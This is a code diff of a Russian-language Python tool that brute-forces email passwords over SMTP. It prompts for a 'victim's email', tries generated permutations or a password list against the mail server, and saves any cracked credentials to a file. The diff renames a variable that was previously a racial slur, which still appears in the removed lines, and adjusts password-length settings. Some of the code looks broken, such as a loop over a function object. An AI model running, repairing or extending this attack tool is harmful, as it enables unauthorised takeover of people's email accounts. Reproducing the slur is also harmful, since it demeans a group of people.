@@ -17,7 +17,6 @@ print("	                   (____/                            ")
 print		("\nЭта утилита для ленивого взлома паролей от почты.")
 print                    ("[+] Coded by Cat0dz [+]")
 print               ("[+] Переведенно на русский BITIW [+]")
-#all data input begins here	
 user = input("Введите почту жертвы: ")	
 protocol = "tls"
 if 'gmail' in user:
@@ -33,7 +32,7 @@ elif 'mail' in user:
     protocol = "ssl"
 
 print('\033[35m' +"Подключаюсь...")
-niggers = 0
+Kira = 0
 print('\033[37m')
 if protocol == "ssl":
  smtpserver_server = smtplib.SMTP_SSL("smtp."+server,port)
@@ -46,9 +45,9 @@ print("Подключён к серверу, готов к атаке.")
 method = input("\nВыберите метод атаки => (a)Брутфорс (b)Список паролей : ")
 perf = input("\nВключть модификации для Raspberry PI?[y/n] : ")
 if perf == "y" or perf =="Y":
- niggers = 0.0002;
+ Kira = 0.0002;
 if method == "a":
-    min_pass = int(input("Введите минимальный размер пароля(Обычно:6): "))
+    min_pass = int(input("Введите минимальный размер пароля(Обычно:8): "))
     print ("\nВы собираетесь атаковать почту: "+'\033[43m'+user)
     print('\033[37m')
     verify2 = input ("Всё верно? [y/n]: ")
@@ -56,10 +55,10 @@ if method == "a":
         def print_perms(chars, minlen, maxlen): 
             for n in range(minlen, maxlen+1): 
                 for perm in itertools.product(chars, repeat=n): 
-                    sleep(niggers)
+                    sleep(Kira)
                     print(''.join(perm)) 
             
-    print_perms ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 72)
+    print_perms ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;", min_pass, 64)
 
     for password in print_perms:
         try:
@@ -90,10 +89,8 @@ class Core1(Thread):
                 print(Fore.GREEN)
                 input("Нажми ENTER что бы сохранить как txt .txt")
                 file = open("password cracked.txt","w")
-                file.write("Email: ")
-                file.write(user)
-                file.write("Пароль: ")
-                file.write(password)
+                file.write("Email: " + user)
+                file.write("Пароль: " + password)
                 file.close()
                 input(Fore.GREEN+"Пароль сохранен! Ищи <password cracked.txt> в папке с брутером")
                 t1.join()
